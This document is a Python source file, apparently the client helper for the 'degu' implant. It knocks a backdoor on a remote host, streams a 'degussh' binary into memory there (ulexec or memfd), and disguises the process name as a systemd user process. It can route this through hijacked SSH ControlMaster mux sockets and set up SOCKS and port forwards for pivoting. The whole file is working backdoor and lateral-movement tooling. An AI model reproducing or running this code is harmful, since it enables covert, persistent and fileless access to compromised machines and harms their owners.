#!/usr/bin/env -S python -u 

import time
import select
import os
import subprocess
import array
import sys
import socket
import struct
import degu
import random
import gzip
import base64
import json
import argparse
import logging

DEGUSSHBIN              = "./degussh"
TIMEOUT                 = 20.0
WAIT_KNOCK              = 4
WAIT_REUSE              = 2
CHUNK                   = 4096*160

MUX_MSG_HELLO           = 0x00000001
MUX_C_NEW_SESSION       = 0x10000002
MUX_C_ALIVE_CHECK       = 0x10000004
MUX_C_TERMINATE         = 0x10000005
MUX_C_OPEN_FWD          = 0x10000006
MUX_C_CLOSE_FWD         = 0x10000007
MUX_C_NEW_STDIO_FWD     = 0x10000008
MUX_C_STOP_LISTENING	  = 0x10000009
MUX_C_DUMP              = 0x00000033
MUX_S_OK                = 0x80000001
MUX_S_PERMISSION_DENIED = 0x80000002
MUX_S_FAILURE           = 0x80000003
MUX_S_EXIT_MESSAGE      = 0x80000004
MUX_S_ALIVE		          = 0x80000005
MUX_S_SESSION_OPENED	  = 0x80000006
MUX_S_REMOTE_PORT	      = 0x80000007
MUX_S_TTY_ALLOC_FAIL	  = 0x80000008
MUX_S_DUMP              = 0x80000033
MUX_FWD_LOCAL           = 1
MUX_FWD_REMOTE          = 2
MUX_FWD_DYNAMIC         = 3
VERSION                 = 0x00000004

# process name for non ulexec
MEMFD_PROC              = "/usr/lib/systemd/systemd --user"
    
def progressbar(label: str, w_in: int, data: bytes):
  total = len(data)
  for i in range(0, total, 1024):
    chunk = data[i:i+1024]
    os.write(w_in, chunk)
    progress = min(i + len(chunk), total) / total
    filled = int(50 * progress)
    bar = '░' * filled + ' ' * (50 - filled)
    sys.stderr.write(f'\r[+] {label:<20}\t|{bar}| {progress:.0%}')
    sys.stderr.flush()  
  sys.stderr.write('\n')

class mux:
  def __init__(self, upath: str):
    self.upath = upath
    self.connect()
    self.debug = True
    self.pid = None
    self.log = logging.Logger("MUX")
  
  def connect(self) -> bool:
    try:
      self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
      self.sock.connect(self.upath)
      return True
    except socket.error:
      self.log.error('[-] failed to bind to %s' % self.upath)
      return False
    
  def close(self):
    self.sock.shutdown(1)
    self.sock.close()
  
  def terminate(self):
    self.connect()
    self.hello()    
    
    req_id = random.randint(0,65000)
    
    term = struct.pack(">I",MUX_C_TERMINATE) + struct.pack(">I",req_id)
    term = struct.pack(">I",len(term)) + term
    self.sock.send(term)
    self.close()

    
  def hello(self) -> bool:
    hello = struct.pack(">I",MUX_MSG_HELLO) + struct.pack(">I",VERSION)
    hello = struct.pack(">I",len(hello)) + hello
    self.sock.send(hello)
    slen = struct.unpack(">I",self.sock.recv(4))[0]
    d = self.sock.recv(slen)
    if slen == 8 :
      try:
        msghello  = d[0:4]
        version   = d[4:8]
        self.log.debug("hello ok")
      except Exception as e:
        self.log.error("error hello %s "%e)
        return False
      return True
    self.log.error("error hello bad len ?!")
    return False
    
    
  def check(self) -> bool:
    self.connect()
    self.hello()    
    
    req_id = random.randint(0,65000)
    
    check = struct.pack(">I",MUX_C_ALIVE_CHECK) + struct.pack(">I",req_id)
    check = struct.pack(">I",len(check)) + check
    self.sock.send(check)
    
    slen = struct.unpack(">I",self.sock.recv(4))[0]
    d = self.sock.recv(slen)
    self.close()
    
    if slen == 12 :
      try:
        s_alive  = d[0:4]
        req_id_s = d[4:8]
        pid      = d[8:12]
        self.pid = struct.unpack(">I", pid)[0]
        self.log.debug("mux ok pid %i with request id: %i <> %i"%(self.pid,req_id,struct.unpack(">I",req_id_s)[0]))
        return True
      except Exception as e:
        self.log.error("error check %s"%e)
        return False
    return False

  def fwd(self, localport: int = 0, remotehost: str = None, remoteport: int = 0, localhost: str = None, rtype: int = None, ops: int = MUX_C_OPEN_FWD)  -> bool:
    self.connect()
    self.hello()
  
    locport = struct.pack(">I", localport)
    remport = struct.pack(">I", remoteport)
    lochost = struct.pack(">I", 0)
    
    if rtype == MUX_FWD_DYNAMIC:
      remhost = struct.pack(">I", len(b"socks")) + b"socks"
      remport = struct.pack(">I", 0)
    elif rtype ==  MUX_FWD_LOCAL or rtype == MUX_FWD_REMOTE: 
      if remotehost :
        remhost = struct.pack(">I", len(remotehost)) + remotehost.encode()
      if localhost :
        lochost = struct.pack(">I", len(localhost)) + localhost.encode()

    req_id = random.randint(0,65000)

    fwd = struct.pack(">I",ops) + struct.pack(">I",req_id) + struct.pack(">I",rtype)
    fwd += lochost
    fwd += locport
    fwd += remhost
    fwd += remport
    fwd = struct.pack(">I",len(fwd)) + fwd
    
    self.sock.send(fwd)
    slen = struct.unpack(">I",self.sock.recv(4))[0]
    resp = self.sock.recv(slen)
    self.close()
    msg = struct.unpack('>I',resp[:4])[0]
    if msg == MUX_S_OK:
      return True
    return False

  def fwd_degu(self, client: degu.degu, pname:str, memfd: bool):
    r_in, w_in, r_out, w_out = None, None, None, None
    try:
      self.connect()
      self.hello()
        
      remport = struct.pack(">I", client.port)
      remhost = struct.pack(">I", len(client.host)) + client.host.encode()
      req_id = random.randint(1, 65000)
      stdio = struct.pack(">I", MUX_C_NEW_STDIO_FWD) + struct.pack(">I", req_id) + struct.pack(">I", 0)
      stdio += remhost + remport
      msg = struct.pack(">I", len(stdio)) + stdio
      self.sock.send(msg)
        
      r_in, w_in = os.pipe()
      r_out, w_out = os.pipe()
      self.sock.sendmsg([b"\x00"], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, array.array("i", [r_in]).tobytes())])
      self.sock.sendmsg([b"\x00"], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, array.array("i", [w_out]).tobytes())])
        
      self.sock.settimeout(TIMEOUT)
      slen = struct.unpack(">I", self.sock.recv(4))[0]
      resp = self.sock.recv(slen)
      self.sock.settimeout(None)
        
      if len(resp) >= 4 and struct.unpack('>I', resp[:4])[0] == MUX_S_SESSION_OPENED:
        ready, _, _ = select.select([r_out], [], [], TIMEOUT)
        if r_out in ready:
          pub = os.read(r_out, 32)
          data = client.mkbuf_mem_exec(
                  DEGUSSHBIN.encode(), 
                  pname.encode(), 
                  pub, 
                  memfd=memfd
                )

          #os.write(w_in, data)
          progressbar(f"{self.upath}->{client.host}", w_in, data)
          
          # wait for bin to exec
          time.sleep(WAIT_REUSE)  
          
          os.write(w_in, b"\n")

          while True:
            try:
              r, _, e = select.select([0, r_out, self.sock], [], [self.sock], TIMEOUT)
                
              if 0 in r:
                data = os.read(0, CHUNK)
                if not data or not os.write(w_in, data):
                  break      
              if r_out in r: 
                data = os.read(r_out, CHUNK)
                if not data or not os.write(1, data):
                  break
                
              if not os.path.exists(self.upath):
                break
                
              try:
                self.sock.getpeername()
              except:
                break
                
              time.sleep(0.01)

            except Exception as e:
              self.log.error(f"error in loop: {e}")
              break
      else:
        self.log.error("mux session not opened")
                
    except Exception as e:
        self.log.error(f"fwd_degu error: {e}")
    finally:
        for fd in [r_in, w_in, r_out, w_out]:
            if fd is not None:
                try: os.close(fd)
                except: pass
        try: 
           self.close()
        except: pass
    return False

  def fwd_knock(self, client: degu.degu, pattern: int):
    buf = client.mkbuf_knock(pattern.encode())
    b64 = base64.b64encode(gzip.compress(buf)).decode()
    result = {'b64': b64, 'p': client.kport, 'host': client.host}
    payload = json.dumps(result)
    self.log.debug(payload)
    
    try:
      self.connect()
      self.hello()

      req_id = random.randint(1, 65000)

      knock = struct.pack(">I", MUX_C_NEW_SESSION) + \
                                struct.pack(">I", req_id) + \
                                struct.pack(">I", 0) + \
                                struct.pack(">I", 0) + \
                                struct.pack(">I", 0) + \
                                struct.pack(">I", 0) + \
                                struct.pack(">I", 1) + \
                                struct.pack(">I", ord("~")) 
      
      terminal = b"xterm-256color"
      subsystem = b"knock"

      knock += struct.pack(">I", len(terminal)) + terminal
      knock += struct.pack(">I", len(subsystem)) + subsystem

      msg = struct.pack(">I", len(knock)) + knock
      self.sock.send(msg)
        
      r_in,   w_in   = os.pipe()
      r_out,  w_out  = os.pipe()
      r_eout, w_eout = os.pipe()

      self.sock.sendmsg([b"\x00"], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, array.array("i", [r_in]).tobytes())])
      self.sock.sendmsg([b"\x00"], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, array.array("i", [w_out]).tobytes())])
      self.sock.sendmsg([b"\x00"], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, array.array("i", [w_eout]).tobytes())])

      slen = struct.unpack(">I",self.sock.recv(4))[0]
      resp = self.sock.recv(slen)

      if len(resp) >= 4 and struct.unpack('>I', resp[:4])[0] == MUX_S_SESSION_OPENED:
        os.write(w_in, payload.encode())
      else:
        self.log.error("mux session not opened")

    except Exception as e:
      self.log.error(f"fwd_knock error : {e}")

    finally:
      for fd in [r_in, w_in, r_out, w_out, r_eout, w_eout]:
        if fd is not None:
          try: os.close(fd)
          except: pass
      try: 
        self.close()
      except: pass

  def fwd_socks(self, port: int) -> bool:
    """
    port: for local port to use for socks
    """
    return self.fwd(localport=port, rtype=MUX_FWD_DYNAMIC)
  
  def fwd_socks_close(self, port: int) -> bool:
    """
    port: for local port to use for socks
    """
    return self.fwd(localport=port,rtype=MUX_FWD_DYNAMIC,ops=MUX_C_CLOSE_FWD)
  
  
  def fwd_local(self,localport: int, remoteport: int, remotehost: str) -> bool:
    """
    localport: local port to listen to
    remoteport: port to forward to
    remotehost: host to forward to
    """
    return self.fwd(localport=localport,remotehost=remotehost,remoteport=remoteport,rtype=MUX_FWD_LOCAL)

  def fwd_local_close(self, localport: int, remoteport: int, remotehost: str) -> bool:
    """
    localport: local port to listen to
    remoteport: port to forward to
    remotehost: host to forward to
    """
    return self.fwd(localport=localport,remotehost=remotehost,remoteport=remoteport,rtype=MUX_FWD_LOCAL,ops=MUX_C_CLOSE_FWD)


  def fwd_remote(self, localport: int, remoteport: int, localhost: str = "*") -> bool:
    """
    localport: local port to listen to
    remoteport: port to wait on remote
    """
    return self.fwd(localport=localport,localhost=localhost,remotehost="127.0.0.1",remoteport=remoteport,rtype=MUX_FWD_REMOTE)
    
  def fwd_remote_close(self, localport: int, remoteport: int, localhost: str = "*") -> bool:
    """
    localport: local port to listen to
    remoteport: port to wait on remote
    """
    return self.fwd(localport=localport,localhost=localhost,remotehost="127.0.0.1",remoteport=remoteport,rtype=MUX_FWD_REMOTE,ops=MUX_C_CLOSE_FWD)
    

class proxy(object):

  def __init__(self, fd):
    self.fd = fd

  def loop(self):
    while True:
      try:
        rs, _, _ = select.select([ sys.stdin, self.fd ], [], [], TIMEOUT )    
        for r in rs:
          if r is sys.stdin:
            data =  r.buffer.raw.read(CHUNK)
            if not data or not self.fd.send( data ):
              break

          elif r is self.fd:
            data = r.recv(CHUNK)
            if not data or not sys.stdout.buffer.write(data):
              break
            sys.stdout.flush()

      except ConnectionResetError as e:
        print(f"[-] reset by peer : {e}",file=sys.stderr)
        break
      except BrokenPipeError as e:
        print(f"[-] broken pipe error {e}",file=sys.stderr)
        break

def sshconnect_unix(unix, host, bind, kport=53, pname=MEMFD_PROC, memfd=False):
  if not os.path.exists(unix):
    print(f"[-] unix {unix} socket doesn't exists", file=sys.stderr)
    sys.exit(-1)

  else:
    m = mux(unix)
    if not m.check():
      print(f"[-] unix {unix} socket doesn't respond", file=sys.stderr)
      sys.exit(-1)

    print(f"[+] knock to {host}:{kport} using {unix} bind to {bind}", file=sys.stderr)
    client = degu.degu(host, kport=kport)
    m.fwd_knock(client,bind)
    
    # wait for knock to process, max 3 seconds
    time.sleep(WAIT_KNOCK) 
    
    m.fwd_degu(client,pname=pname,memfd=memfd)


def sshconnect_bind(host,kport,bind,pname=MEMFD_PROC):

  client = degu.degu(host)
  client.kport = kport
  client.knock( bind )

  print(f"[+] knock to {host}:{kport} bind to {bind}", file=sys.stderr)
  
  # wait for knock to process, max 3 seconds
  time.sleep(WAIT_KNOCK) 

  try:
    s = socket.socket()
    s = socket.create_connection((client.host, client.port), timeout=degu.CONNECT_TIMEOUT)
    s.setblocking(True)
    ready, _, _ = select.select([s], [], [], TIMEOUT)
    if s in ready:
      pub = s.recv(32)
      data = client.mkbuf_mem_exec(
                        DEGUSSHBIN.encode(), 
                        pname.encode(), 
                        pub, 
                        memfd=False
                    )
    
      progressbar(f"DIRECT->{client.host}", s.fileno(), data)
    
      # wait for exe execution before reuse fd
      time.sleep(WAIT_REUSE) 
      try:
        s.send(b"\n")
      except ConnectionResetError:
        print("[-] ulexec error retrying with memfd",file=sys.stderr)
        client.knock( bind )
        time.sleep(WAIT_KNOCK) 
        try:
          s = socket.socket()
          s.connect((client.host, client.port))
          ready, _, _ = select.select([s], [], [], TIMEOUT)
          if s in ready:
            pub = s.recv(32)
            data = client.mkbuf_mem_exec(
                        DEGUSSHBIN.encode(), 
                        pname.encode(), 
                        pub, 
                        memfd=True
                    )
            progressbar(f"DIRECT->{client.host}", s.fileno(), data)
            time.sleep(WAIT_REUSE) 
            s.send(b"\n")
        except Exception as e:
          print("[-] memfd exec not working :( ",file=sys.stderr)
          
      p = proxy(s)
      p.loop()
    else:
      print("[-] degu timeout",file=sys.stderr)

  except ConnectionRefusedError:
    print("[-] degu not responding",file=sys.stderr)
  except socket.timeout:
    print("[-] degu not responding",file=sys.stderr)


def main():

    parser = argparse.ArgumentParser(description='ProxyCommand  degussh helper')
    parser.add_argument('-i', '--ip', required=True, help='ip address')
    parser.add_argument('-p', '--port',  type=int, default=53, help='knock port (default 53)')
    parser.add_argument('-b', '--bind',  type=str, default=f":{random.randint(1025,65000)}", help='bind/reverse string (default random port)')
    parser.add_argument('-u', '--unix',  type=str, help='knock unix socks')
    
    try:
        args, _ = parser.parse_known_args()
    except SystemExit:
        sys.exit(-1)
    
    host = None
    try:
        host = socket.gethostbyname(args.ip)
    except socket.gaierror as e:
        print(f"[-] error resolving {args.ip} {e}")
        sys.exit(-1)

    kport = args.port

    if args.unix:
        sshconnect_unix(args.unix, host, args.bind, kport)
    if not args.unix:
        sshconnect_bind(host, kport, args.bind)
    
if __name__ == "__main__":
    main()



